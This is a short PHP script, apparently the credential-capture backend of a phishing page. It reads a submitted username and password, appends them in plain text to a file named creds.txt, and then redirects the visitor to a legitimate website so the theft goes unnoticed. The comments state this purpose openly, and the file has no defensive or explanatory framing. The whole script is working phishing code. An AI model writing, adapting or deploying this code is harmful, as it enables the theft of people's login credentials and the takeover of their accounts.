<?php
// Log credentials to a text file
$file = 'creds.txt';
$username = $_POST['username'];
$password = $_POST['password'];
$log_entry = "Username: $username | Password: $password\n";

// Append credentials to creds.txt
file_put_contents($file, $log_entry, FILE_APPEND | LOCK_EX);

// Redirect to a legitimate website after logging credentials
header("Location: https://www.example.com"); // Replace with a legitimate URL
exit();
?>
